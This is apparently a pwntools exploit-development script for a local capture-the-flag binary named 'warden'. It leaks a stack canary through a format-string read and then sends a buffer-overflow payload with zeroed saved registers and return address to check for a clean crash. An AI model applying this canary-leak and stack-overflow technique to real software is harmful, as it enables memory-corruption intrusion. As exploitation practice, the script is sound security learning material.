from pwn import *
context.arch = 'i386'

p = process('./warden')
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%15$08x')
canary = int(p.recvuntil(b'Pow')[:-3].strip(), 16)
print(f"Canary: {hex(canary)}")

# Try to just return normally but with same addresses
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)  # ebx
payload += p32(0)  # ebp  
payload += p32(0)  # ret = 0, should crash cleanly

p.sendline(payload)
sleep(0.5)
print("Exit code:", p.poll(block=True))
